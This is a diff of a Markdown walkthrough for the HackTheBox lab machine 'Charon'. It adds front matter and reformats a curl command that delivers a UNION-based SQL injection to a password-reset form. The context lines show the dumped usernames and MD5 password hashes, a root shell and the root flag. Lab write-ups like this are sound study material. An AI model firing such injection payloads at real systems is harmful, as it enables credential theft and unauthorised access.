@@ -1,3 +1,7 @@
+---
+icon: flag
+---
+
 # Charon
 
 ## Enumeration
@@ -138,7 +142,8 @@ $ curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.h
 retrieve all data from the columns where the email is not "test", resulting tin the retrieval of md5 hashed passwords
 
 ```bash
-$ curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.htb' Union select 1,group_concat(__username_,0x3a,__password_,0x3a,email),3,\"x@charon.htb\" from operators where email not like '%test%'-- -" -d "submit=submit" | grep "<h2>" | awk -F'<h2>' '{print $2}' | tr "," "\n"
+$ curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.htb' Union select 1,group_concat(__username_,0x3a,__password_,0x3a,email),3,\"x@charon.htb\" from operators where email not like '%test%'-- -" -d "submit=submit" | grep "<h2>" | awk -F'<h2>' '{print $2}' | tr "," "
+"
  Email sent to: x@charon.htb=>super_cms_adm:0b0689ba94f94533400f4decd87fa260:adm@nowhere.com
 decoder:5f4dcc3b5aa765d61d8327deb882cf99:decoder@nowhere.com
 ```
@@ -391,4 +396,3 @@ uid=1001(decoder) gid=1001(freeeze) euid=0(root) groups=1001(freeeze)
 bash-4.3# cat /root/root.txt 
 f812af812a
 ```
-
